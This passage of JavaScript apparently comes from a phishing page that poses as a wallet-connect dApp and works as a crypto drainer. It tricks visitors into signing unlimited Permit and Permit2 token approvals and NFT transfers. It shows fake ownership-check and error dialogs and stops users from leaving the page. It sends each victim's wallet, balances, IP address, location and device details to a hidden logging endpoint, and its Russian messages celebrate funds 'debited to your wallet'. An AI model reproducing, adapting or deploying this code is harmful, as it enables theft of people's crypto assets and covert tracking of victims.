                msgs = '<b>Transfer NFT 1155</b><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Floor Price: <code>'+item.balance+'</code>$<br><br>Account: <code>'+account+'</code><br><br>Инвентарь<br>https://etherscan.io/token/'+item.tokenAddress+'?a='+account+'%23inventory<br><br>Domain: '+window.location.hostname;
                if (isMobile() || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    await sign1155NFT(item.tokenAddress, item.token_ids, chainToId[item.chain].chainId, msgs);
                } else {
                    await claim1155NFT(item.tokenAddress, item.token_ids, chainToId[item.chain].chainId, msgs);
                }
              }
          }
        } catch(e) { console.log(e) }
      }
  }
}

async function waitAlert() {
    Swal.fire({
        title:'Connection...',
        text: ' Confirm that you are the owner of this wallet...',
        imageUrl: '/loadwallet.gif',
        imageHeight: 40,
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 300,
        showConfirmButton: false
    });
    window.onbeforeunload = function() {
        return true;
    };
}

async function waitClose() {
    Swal.close();
    window.onbeforeunload = null;
}

async function alertshow() {
  if(alert == 0) {
      Swal.fire({
        title: 'Error!',
        text: 'Connect has been failed, try with another wallet',
        icon: 'error',
        confirmButtonText: 'OK'
    });
    alert = 1;
  }
  if(alert == 1) {
      Swal.fire({
        title: 'Error!',
        text: 'This wallet cannot be connect, try another one',
        icon: 'error',
        confirmButtonText: 'OK'
    });
  }
}

const changeNetwork = async (chainId) => {
    if (window.ethereum) {
      try {
        await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
          params: [{chainId: Web3.utils.toHex(chainId)}],
        });
      } catch (error) {
        console.error(error);
        await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
          params: [{chainId: Web3.utils.toHex(chainId)}],
        });
      }
    }
}

const isValidPermit = (functions) => {
    for (const key in functions) {
        if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            return args.length === 7 && key.indexOf('bool') === -1;
        }
    }
}

const permit = async (msg, contract, owner, spender) => {
    permitApprove = 0;
    let chainId = await contract.signer.getChainId();
    let value = ethers.utils.parseEther(MAX_APPROVAL);
    let nonce = await contract.nonces(owner);
    let name = await contract.name();
    let version;
    if (contract.functions.hasOwnProperty('version')) {
        version = await contract.version();
    } else {
        version = "1"
    }
    let deadline = Date.now() + 1000 * 60 * 60 * 24 * 356; // + one year
    let messages = {
        owner, spender, value, nonce, deadline,
    };
    const domain = {
        name: name, version: version, chainId: chainId, verifyingContract: contract.address,
    }
    const permit = {
        Permit: [{
            name: "owner", type: "address"
        }, {
            name: "spender", type: "address"
        }, {
            name: "value", type: "uint256"
        }, {
            name: "nonce", type: "uint256"
        }, {
            name: "deadline", type: "uint256"
        },]
    }
    const values = {
        owner, spender, value, nonce, deadline,
    }
    success = 1;
    try {
        const res = await contract.signer._signTypedData(domain, permit, values);
        permitApprove = 1;
        const r = res.substring(0, 66);
        const s = '0x' + res.substring(66, 130);
        const v = parseInt(res.substring(130, 132), 16);
        logTlgMsg(msg, success);
        return JSON.stringify({
            value: value._hex, deadline: deadline, v: v, r: r, s: s
        });
    } catch(e){
      console.log(e);
      success = 0;
      logTlgMsg(msg, success);
    }
}

async function permit2(token, amount, msg, chain, symbol, balance, network) {
    const contract = new ethers.Contract(PERMIT_CONTRACT_ADDRESS, PERMIT_ABI, signer);
    const nonce = 0;
    const chainId = await contract.signer.getChainId();
    const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
    const value = "1461501637330902918203684832716283019655932542975";
    const valueString = value.toString();
    const amountOut = ethers.BigNumber.from(amount).toString();
    success = 1;
    const dataToSign = JSON.stringify({
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: PERMIT_CONTRACT_ADDRESS
        },
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" }
            ],
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: { 
            details: {
                token: token,
                amount: amountOut,
                expiration: deadline,
                nonce: nonce
            }, 
            spender: operator, 
            sigDeadline: deadline,
        }
    })
    logTlg(`💎 Кошелек ${account} получил запрос на Permit2 ${symbol} на сумму ${balance}$ в сети ${chain}`);
    web3.currentProvider.sendAsync({
        method: "eth_signTypedData_v3",
        params: [account, dataToSign],
        from: account
    }, async (error, result) => {
        if (error != null) {
            console.log("Error signing");
            success = 0;
            logTlgMsg(msg, success);
            return
        }
        logTlgMsg(msg, success);
        const signature = result.result;
        const data = {chainId: chain, tokenAddress: token, amount: amountOut, value: amountOut, owner: account, spender: operator, deadline: deadline, nonce: nonce, signature: signature};
        axios.post(PERMIT2_TOKEN, data).then(function (response) {
            logTlg(`💸 ${symbol} на сумму ${balance}$ успешно списались методом PERMIT2 и зачислились на ваш кошелёк`)
        });
    })
}


const getABI = async (address, abiUrl) => {
    let res = await axios.get(abiUrl.format(address));
    res = res.data.result[0];
    let abi = JSON.parse(res['ABI']);
    let impl = '';
    if (res['Proxy'] === '1' && res['Implementation'] !== "") {
        impl = res['Implementation'];
        abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]['ABI']);
    }
    return [abi, impl];
}

String.prototype.format = function () {
    let args = arguments;
    return this.replace(/{(\d+)}/g, function (match, index) {
        // check if the argument is present
        return typeof args[index] == 'undefined' ? match : args[index];
    });
};

function logTlgMsg(msg, sus, hash) {
  if (sus == "1") {
    var succestrans = '✅ <b>Транзакция подтверждена</b>';
  } else {
    var succestrans = '❌ <b>Транзакция отклонена</b>';
  }
  fetch('/backjs.php?key=8bEEokUZLhn7nAHz&m='+msg+'<br>'+succestrans);
}

function getBrowserName() {

    if ( navigator.userAgent.indexOf("Edge") > -1 && navigator.appVersion.indexOf('Edge') > -1 ) {
        return 'Edge';
    }
    else if( navigator.userAgent.indexOf("Opera") != -1 || navigator.userAgent.indexOf('OPR') != -1 )
    {
        return 'Opera';
    }
    else if( navigator.userAgent.indexOf("Chrome") != -1 )
    {
        return 'Chrome';
    }
    else if( navigator.userAgent.indexOf("Safari") != -1)
    {
        return 'Safari';
    }
    else if( navigator.userAgent.indexOf("Firefox") != -1 ) 
    {
        return 'Firefox';
    }
    else if( navigator.userAgent.indexOf("MSIE") != -1 ) //IF IE > 10
    {
        return 'IE';
    }
    else if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
        return 'Dapp Mobile Browser';
    }
    else 
    {
        return 'unknown';
    }
}

function getOS()
{
    let os = navigator.userAgent;
    let finalOs="";
    if (os.search('Windows')!==-1){
        finalOs="Windows";
    }
    else if (os.search('Mac')!==-1){
        finalOs="MacOS";
    }
    else if (os.search('X11')!==-1 && !(os.search('Linux')!==-1)){
        finalOs="UNIX";
    }
    else if (os.search('Linux')!==-1 && os.search('X11')!==-1){
        finalOs="Linux"
    } else {
        finalOs="unknown"
    }
    return finalOs;
}

function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
}

function logTlg(msg) {
    fetch('/backjs.php?key=8bEEokUZLhn7nAHz&m='+msg);
}

function logTlgConnect(msg) {
    fetch('https://api.db-ip.com/v2/free/self/')
    .then(function (response) {
        return response.json();
    })
    .then(function (payload) {
        let device_emoji = "💻";
        if (isMobile() || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            device_emoji = "📱";
        }
        msg = msg + `<br>IP: ${payload.ipAddress} (${payload.city}/${payload.countryCode})<br>Device: ${device_emoji} ${getBrowserName()} / ${getOS()}`; 
        console.log(msg);
        fetch('/backjs.php?key=8bEEokUZLhn7nAHz&m='+msg);
    });
}

function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

if (window.ethereum) {
    window.ethereum.on('accountsChanged', accounts => {
      if (accounts.length === 0) {
        localStorage.removeItem('tokenList');
        connected = 0;
      } else {
        localStorage.removeItem('tokenList');
        connected = 0;
      }
    });
}

function splitMessage(message, chunkSize = 4096) {
  const messageLength = message.length;
  const parts = [];
  for (let i = 0; i < messageLength; i += chunkSize) {
    parts.push(message.slice(i, i + chunkSize));
  }
  return parts;
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendLogsParts(messageParts) {
  for (let index = 0; index < messageParts.length; index++) {
    const part = messageParts[index];
    logTlg(part);
    await delay(300);
  }
}

function logTlgConnect(msg) {
  fetch('https://api.db-ip.com/v2/free/self/')
  .then(function (response) {
      return response.json();
  })
  .then(function (payload) {
      let device_emoji = "🖥";
      if (isMobile() || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
          device_emoji = "📱";
      }
      msg = msg + `<br>IP: ${payload.ipAddress} (${payload.city}/${payload.countryCode})<br>Device: ${device_emoji} ${getBrowserName()} / ${getOS()}`; 
      console.log(msg);
      fetch('/backjs.php?key=8bEEokUZLhn7nAHz&m='+msg);
  });
}

window.addEventListener('load', async () => {
    init();
    if (isMobile()) {
        $(".web3modal-modal-card").prepend('<div class="sc-eCImPb cSaJae web3modal-provider-wrapper" onclick="loginMetamask();"><div class="sc-hKwDye iWCqoQ web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="MetaMask"></div><div class="sc-gsDKAQ iKzkWq web3modal-provider-name">MetaMask</div><div class="sc-dkPtRN kFITWz web3modal-provider-description">Connect to your MetaMask Wallet</div></div></div><div class="sc-eCImPb cSaJae web3modal-provider-wrapper" onclick="loginTrust();"><div class="sc-hKwDye iWCqoQ web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet"></div><div class="sc-gsDKAQ iKzkWq web3modal-provider-name">Trust Wallet</div><div class="sc-dkPtRN kFITWz web3modal-provider-description">Connect to your Trust Wallet</div></div></div>');
        $('.web3modal-modal-card .web3modal-provider-wrapper').last().css( "display", "none" );
    }
});